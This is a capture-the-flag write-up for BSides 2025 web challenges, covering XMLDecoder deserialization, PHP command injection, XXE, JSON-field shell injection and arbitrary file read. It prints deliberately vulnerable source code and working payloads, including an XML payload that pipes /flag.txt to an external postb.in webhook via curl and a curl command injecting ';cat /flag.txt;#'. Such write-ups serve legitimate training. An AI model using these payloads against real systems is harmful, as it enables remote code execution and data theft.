--------------------

### CTF-: BsidesCTF 2025

--------------------

![image](https://github.com/user-attachments/assets/5758bd60-e622-47de-9566-4e408ae2f6f7)

---------------------

### Challenges

----------------------

- Web-:
  - Dating
  - Detector
  - Detector-2
  - Evidence
  - Hangman-one
  - Hoard
  - Sighting

-----------------------

### Dating

-----------------------

![image](https://github.com/user-attachments/assets/a7046cc7-6849-408c-8aab-17124266f0a6)


-----------------------

- The challenge contains this java file `ProfileServlet.java`.

```java
package com.example.dragon;

import jakarta.servlet.ServletException;
import jakarta.servlet.annotation.WebServlet;
import jakarta.servlet.http.HttpServlet;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;

import java.beans.XMLDecoder;
import java.io.IOException;

@WebServlet("/ProfileServlet")
public class ProfileServlet extends HttpServlet {

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        response.setContentType("text/plain");

        try {
            XMLDecoder decoder = new XMLDecoder(request.getInputStream());
            Object dragonData = decoder.readObject();
            decoder.close();

            response.getWriter().write("Profile received for: " + dragonData.toString());
        } catch (Exception e) {
            response.getWriter().write("Error processing profile: " + e.getMessage());
        }
    }
}
```

- My eyes caught this  line `XMLDecoder decoder = new XMLDecoder(request.getInputStream());`.This class `XML Decoder` in java is vulnerable to `Insecure Deserialization` which can lead to RCE.A specially crafted XML payload can be used to invoke arbitrary java classes and methods to trigger RCE on the server.
- My Xml Payload-:

```xml
<java version="1.8.0" class="java.beans.XMLDecoder">
  <void class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3">
      <void index="0">
	<string>/bin/bash</string>
      </void>
      <void index="1">
	<string>-c</string>
      </void>
      <void index="2">
	      <string>cat /flag.txt | /usr/bin/curl https://www.postb.in/1745777549695-6946147335693 -d @-</string>
      </void>
    </array>
    <void method="start" id="process">
    </void>
  </void>
</java>
```

- The payload invokes class `java.lang.ProcessBuilder` which runs the `bash` binary with `-c` option to run a statement.Since I can't get an output, I interacted with a web hook with curl which serves the result of the executed command `cat /flag.txt` as `POST` data.

![image](https://github.com/user-attachments/assets/3cff1ab8-2554-4846-a2f9-c49bb10658f0)

- Web hook's result-:

![image](https://github.com/user-attachments/assets/5aa72db4-31a6-4dfb-93df-3a6c0470c2e5)

- Flag-:```CTF{helping-dragons-find-love-since-2025}```

---------------------------

### Detector

---------------------------

![image](https://github.com/user-attachments/assets/7ca325f0-6f4d-4ce1-aee3-8b6d826e2b80)

--------------------------

- It contains 2 source files `index.php` and `detect-dragon.php`.The vulnerable point is the `detect-dragon.php`.

```php
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dragon Detector</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
<?php
  $ip = $_REQUEST['ip'];

  echo "<h1>";
  system("bash /app/dragon-detector-ai $ip");
  echo "</h1>";

  echo '<br><a href="/">Check another IP</a>';
?>
    </div>
</body>
</html>
```

- The vulnerable parameter is `$_REQUEST['ip']` because it gets passed unfiltered to a shell statement in `system()` and it is not news that `system()` is vulnerable to command injection.I closed the statement with `;` to execute a new command.

```php
<?php
  $ip = $_REQUEST['ip'];

  echo "<h1>";
  system("bash /app/dragon-detector-ai $ip");
  echo "</h1>";

  echo '<br><a href="/">Check another IP</a>';
?>
```

- Exploiting it by executing command `id`-:

![image](https://github.com/user-attachments/assets/1fbcab48-a4dd-4191-bd81-42470f7b2451)

- Flag-:```CTF{tharr-be-draggggons}```

![image](https://github.com/user-attachments/assets/8e721bc5-4867-4bdb-8723-6ca822365c4f)


--------------------

### Detector-2

--------------------

![image](https://github.com/user-attachments/assets/e6d01ca7-f5b4-4d25-bc9c-d2f600dc8b22)

--------------------

- Detetor is back again but with a twist this time.Let's dive into the code of `detect-dragon`.

```php
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dragon Detector</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
<?php
  $ip = $_REQUEST['ip'];

  if (str_contains($ip, "\"")) {
      echo "<h1>🛑 Invalid IP Address!</h1>";
      echo "<p>That doesn't look like a valid IP address. Are you sure that's not a goblin lair?</p>";
      echo '<a href="/">Try again</a>';
      exit;
  }


  echo "<h1>";
  system("bash /app/dragon-detector-ai \"$ip\"");
  echo "</h1>";

  echo '<br><a href="/">Check another IP</a>';
?>
    </div>
</body>
</html>
```

- The code checks if the string contains `"` and raises an error if it is in it.

```php
if (str_contains($ip, "\"")) {
      echo "<h1>🛑 Invalid IP Address!</h1>";
      echo "<p>That doesn't look like a valid IP address. Are you sure that's not a goblin lair?</p>";
      echo '<a href="/">Try again</a>';
      exit;
  }
```

- If it passes the statement, the string is passed to shell statement `bash /app/dragon-detector-ai \"$ip\"` and `"` is required to close the statement and execute another statemnent.Although there is a walkaround, bash statement can also be executed within `$()` or backticks.
- Exploiting it-:

![image](https://github.com/user-attachments/assets/3fb9fe78-ad18-44af-aaac-132a51ee1e79)

- Flag-:```CTF{tharr-be-MORE-draggggons}```

----------------------

### Evidence

----------------------

![image](https://github.com/user-attachments/assets/c56337a0-e3ce-4960-8948-e7aad257fdec)

----------------------

- Source Code-:

```php
<!DOCTYPE html>
<?php
  error_reporting(E_ALL & ~E_DEPRECATED & ~E_NOTICE);
?>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dragon Evidence</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <h1>Dragon Evidence</h1>

<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['dragon_file'])) {
        $file = $_FILES['dragon_file']['tmp_name'];
        
        // We demand FREEDOM (from secure defaults)
        libxml_disable_entity_loader(false);
        $dom = new DOMDocument();
        $dom->loadXML(file_get_contents($file), LIBXML_NOENT | LIBXML_DTDLOAD);
        
        echo "<h2>Dragon Evidence Found:</h2>";
        echo "<pre>" . htmlspecialchars($dom->saveXML()) . "</pre>";
    }
} else {
?>
        <p>They said dragons were myths... but we know better.</p>
        <p class="fire">Upload your classified XML evidence to expose the truth.</p>

        <form class="dragons" method="POST" enctype="multipart/form-data">
            <input type="file" name="dragon_file" accept=".xml">
            <input type="submit" value="Submit Evidence">
        </form>
<?php
}
?>

        <footer>
            <p>🔥 The truth is out there... 🔥</p>
        </footer>
    </div>
</body>
</html>
```

- The code allows upload of xml files which also gets parsed.Vulnerable Code-:

```php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['dragon_file'])) {
        $file = $_FILES['dragon_file']['tmp_name'];
        
        // We demand FREEDOM (from secure defaults)
        libxml_disable_entity_loader(false);
        $dom = new DOMDocument();
        $dom->loadXML(file_get_contents($file), LIBXML_NOENT | LIBXML_DTDLOAD);
        
        echo "<h2>Dragon Evidence Found:</h2>";
        echo "<pre>" . htmlspecialchars($dom->saveXML()) . "</pre>";
    }
```

- The snippet above is vulnerable xml injection because the libxml_disable_entity_loader function is set to `false` which means we can load entities and most importantly `read files`.

```php
libxml_disable_entity_loader(false);
$dom = new DOMDocument();
$dom->loadXML(file_get_contents($file), LIBXML_NOENT | LIBXML_DTDLOAD);
```

- Exploitation with burpsuite-:

![image](https://github.com/user-attachments/assets/0887a4d0-ce51-4578-89cb-fc960e9b5f67)

- Flag-: ```CTF{aha-found-em}```

------------------------

### Hangman-one

------------------------

![image](https://github.com/user-attachments/assets/97374fcc-0f3c-4776-bde7-78f2d08bdafb)

------------------------

- The challenege requires us to guess the flag, we can get the flag by guessing the chars with multiple accounts till we get it.It is an hangman themed game.

![image](https://github.com/user-attachments/assets/cdce05f2-9ff1-43f8-b000-f97d5fde98c8)

- Flag-: ```CTF{hangm4nw1thfr1end5andf03s}```

--------------------------

### Hoard

--------------------------

![image](https://github.com/user-attachments/assets/bdd8acde-9762-4cea-941e-adcaf8ff8b3b)

--------------------------

- This challenge is dope,it is command injection with certain setbacks.Let's look at the backend-:

```php
<?php
header('Content-Type: application/json');

// Ensure the request method is POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $input = file_get_contents('php://input');
  $data = json_decode($input, true);

  // Validate the JSON input
  if ($data) {
    // Validate
    if(!preg_match('/[0-9]*/', $data['gold']) || !preg_match('/[0-9]*/', $data['gems']) || !preg_match('/[0-9]*/', $data['artifacts'])) {
      echo json_encode([
        "status" => "error",
        "message" => "Fire-scorched parchment detected - invalid submission"
      ]);
      exit(1);
    } else {
      if($data['hoardType'] == 'gold') {
        $valuation = $data['gold'] * 100;
      } elseif($data['hoardType'] == 'gemstone') {
        $valuation = $data['gems'] * 1000;
      } elseif($data['hoardType'] == 'artifact') {
        $valuation = shell_exec("/app/valuate-hoard '" . $data['gold'] . "' '" . $data['gems'] . "' '" . $data['artifacts'] . "'");
      } else {
        http_response_code(400);
        echo json_encode([
          "status" => "error",
          "message" => "Fire-scorched parchment detected - invalid submission"
        ]);
        exit(1);
      }

      echo json_encode([
        "status" => "success",
        "message" => "Hoard valuation logged and valued at <tt>$valuation</tt>"
      ]);
    }
  } else {
      // Handle invalid JSON input
      http_response_code(400);
      echo json_encode([
        "status" => "error",
        "message" => "Fire-scorched parchment detected - invalid submission"
      ]);
  }
} else {
  // Handle non-POST requests
  http_response_code(405); // Method Not Allowed
  echo json_encode([
    "status" => "error",
    "message" => "Only POST requests are allowed for hoard valuation"
  ]);
}
?>
```

- The `backend.php` takes in json body as data and checks if the json keys `gold`,`gems` and `artifacts` are present.Lastly, the `hoardType` must be set.

```php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $input = file_get_contents('php://input');
  $data = json_decode($input, true);

  // Validate the JSON input
  if ($data) {
    // Validate
    if(!preg_match('/[0-9]*/', $data['gold']) || !preg_match('/[0-9]*/', $data['gems']) || !preg_match('/[0-9]*/', $data['artifacts'])) {
      echo json_encode([
        "status" => "error",
        "message" => "Fire-scorched parchment detected - invalid submission"
      ]);
      exit(1);
```

- Our main target is the `hoardType` artifacts because it gets passed to a shell statement.

```php
shell_exec("/app/valuate-hoard '" . $data['gold'] . "' '" . $data['gems'] . "' '" . $data['artifacts'] . "'");
```

- Although,there is a slight twist, we can't execute a shell command with `$()` because of the double quotes.Everything passed will be treated as a string.e,g

```bash
HP@H-DOLAPO22 MINGW64 ~/Downloads/Telegram Desktop
$ /app/valuate-hoard '$data['gold']' '$data['gems']' 'data['artifacts']'
```

- I exploited it by closing the first `'` with `'` in param `gold`, then we will pass our statement with `$()` and use `#` to comment the other statement which will not be executed.The whole idea-:

```
'$(ls) #
```

- Exploiting it-:

 ![image](https://github.com/user-attachments/assets/b9780e77-27d4-4c3e-9e23-aaaa46f673d0)

 - Flag-:```CTF{a-dragons-hoard-is-all-he-has-dont-take-it-away}```

```bash

┌──(root💀lulz-PhotoAuto)-[~]
└─# curl https://hoard-049015ac.challenges.bsidessf.net/backend.php -H "Content-Type: application/json" -d $'{"gold":"\';cat /flag.txt;#","gems":"1000","artifacts":"1000","hoardType":"artifact"}'
{"status":"success","message":"Hoard valuation logged and valued at <tt>Usage: \/app\/valuate-hoard num1 num2 num3\nCTF{a-dragons-hoard-is-all-he-has-dont-take-it-away}\n<\/tt>"}
```

----------------------

### SIGHTING

----------------------

![image](https://github.com/user-attachments/assets/a9462c49-7a7a-454c-a6cc-16d32c1c9632)

----------------------

- I inspected the source code and discovered this file `picture.php` with parameter `file` to read files.This page is vulnerable to `Arbitrary File Read`.

![image](https://github.com/user-attachments/assets/8df10915-23a8-4e49-9e5a-b8242f8df2bc)

- Reading the flag file at `/flag.txt`.

![image](https://github.com/user-attachments/assets/4c63539f-dcf8-402f-8d60-b3d83b1be4f2)

---------------------










